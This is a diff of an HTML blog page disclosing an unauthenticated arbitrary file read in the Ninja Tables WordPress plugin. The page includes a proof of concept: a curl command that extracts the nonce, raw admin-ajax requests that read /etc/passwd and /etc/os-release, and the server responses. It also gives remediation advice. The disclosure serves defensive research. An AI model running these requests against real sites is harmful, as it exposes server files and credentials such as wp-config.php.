@@ -216,25 +216,38 @@
         <div class="container">
             <a href="index.html" class="back-link">← Back to Home</a>
             
-            <p>Good Day!<br>
-            I truly hope everything is awesome on your side of the screen! 😊</p>
+            <p>This security research details a critical vulnerability discovered in the Ninja Tables WordPress plugin that allows unauthenticated attackers to read arbitrary files from the target server.</p>
 
             <div class="vulnerability-box">
-                <h2>🚨 Vulnerability: Unauthenticated Arbitrary File Read via `ninja_table_force_download`</h2>
-                <p>The Ninja Tables plugin for WordPress (versions < 4.1.9) contains a critical vulnerability in the AJAX action `ninja_table_force_download`. Improper validation of the `url` parameter allows an unauthenticated attacker to read arbitrary files from the server such as `/etc/passwd`, `/etc/os-release`, and `wp-config.php`.</p>
+                <h2>Vulnerability Details: Unauthenticated Arbitrary File Read via `ninja_table_force_download`</h2>
+                <p><strong>CVE:</strong> Pending Assignment</p>
+                <p><strong>CVSS Score:</strong> 7.5 (High)</p>
+                <p><strong>Affected Versions:</strong> Ninja Tables < 4.1.9</p>
+                <p><strong>Vulnerability Type:</strong> Local File Inclusion (LFI)</p>
+                <br>
+                <p>The Ninja Tables plugin for WordPress contains a critical vulnerability in the AJAX action `ninja_table_force_download`. The vulnerability stems from insufficient input validation of the `url` parameter, which allows unauthenticated attackers to traverse the file system and read arbitrary files from the server.</p>
+                <p>Attackers can exploit this vulnerability to access sensitive files including system configuration files (`/etc/passwd`, `/etc/os-release`), application configuration files (`wp-config.php`), environment variables (`.env`), and application logs.</p>
             </div>
 
             <hr>
 
-            <h2>🔍 Proof of Concept (PoC) Steps</h2>
+            <h2>Proof of Concept (PoC) Steps</h2>
 
             <h3>1. Extract the Nonce</h3>
 
+            <p>First, we need to extract the public nonce from the target website's source code:</p>
+
             <div class="code-block">
-                <pre>curl -s https://target.com | grep -oP '"ninja_table_public_nonce":"\K[a-z0-9]+'</pre>
+                <pre><code># Extract nonce from WordPress page source
+curl -s https://target.com | grep -oP '"ninja_table_public_nonce":"\K[a-z0-9]+'
+
+# Alternative method using browser developer tools
+# 1. Open browser developer console (F12)
+# 2. Search for 'ninja_table_public_nonce' in page source
+# 3. Copy the alphanumeric value</code></pre>
             </div>
 
-            <p><strong>Example output:</strong></p>
+            <p><strong>Expected output:</strong></p>
             <div class="code-block">
                 <pre>3d22ded27c</pre>
             </div>
@@ -245,7 +258,7 @@
 
             <h3>2. Read `/etc/os-release`</h3>
 
-            <h4>📝 Raw Request</h4>
+            <h4>HTTP Request</h4>
 
             <div class="code-block">
                 <pre>GET /wp-admin/admin-ajax.php?action=ninja_table_force_download&url=/etc/os-release&ninja_table_public_nonce=3d22ded27c HTTP/2
@@ -267,7 +280,7 @@ Priority: u=0, i
 Connection: keep-alive</pre>
             </div>
 
-            <h4>✅ Expected Response</h4>
+            <h4>Server Response</h4>
 
             <div class="code-block">
                 <pre>HTTP/2 200 OK
@@ -285,7 +298,7 @@ ID=ubuntu
 
             <img class="blog-image" src="https://github.com/user-attachments/assets/16bf77bc-e09a-4b3f-9494-2ae123df80a9" alt="Reading /etc/passwd file" />
 
-            <h4>📝 Raw Request</h4>
+            <h4>HTTP Request</h4>
 
             <div class="code-block">
                 <pre>GET /wp-admin/admin-ajax.php?action=ninja_table_force_download&url=/etc/passwd&ninja_table_public_nonce=3d22ded27c HTTP/2
@@ -307,7 +320,7 @@ Priority: u=0, i
 Connection: keep-alive</pre>
             </div>
 
-            <h4>✅ Expected Response</h4>
+            <h4>Server Response</h4>
 
             <div class="code-block">
                 <pre>HTTP/2 200 OK
@@ -318,12 +331,12 @@ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 ...</pre>
             </div>
 
-            <p><em>May you be well on your side of the screen :)</em></p>
+
 
             <hr>
 
             <div class="impact-box">
-                <h2>💥 Impact</h2>
+                <h2>Security Impact</h2>
                 <ul>
                     <li><strong>Unauthenticated Local File Read</strong></li>
                     <li>Disclosure of sensitive server files (<code>/etc/passwd</code>, <code>/wp-config.php</code>, <code>.env</code>, logs)</li>
@@ -334,13 +347,13 @@ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
             <hr>
 
             <div class="remediation-box">
-                <h2>🛠️ Remediation</h2>
+                <h2>Remediation</h2>
                 <p>Update the <strong>Ninja Tables plugin</strong> to version <strong>4.1.9 or higher</strong> where this issue has been patched.</p>
             </div>
 
             <hr>
 
-            <h2>📚 References</h2>
+            <h2>References</h2>
             <ul>
                 <li><a href="https://xbow.com/blog/xbow-ninja-tables/" target="_blank" style="color: var(--primary);">Xbow Security Blog</a></li>
                 <li><a href="https://ninjatables.com/docs/change-log/#521-date-july-9-2025" target="_blank" style="color: var(--primary);">NinjaTables Official Changelog</a></li>
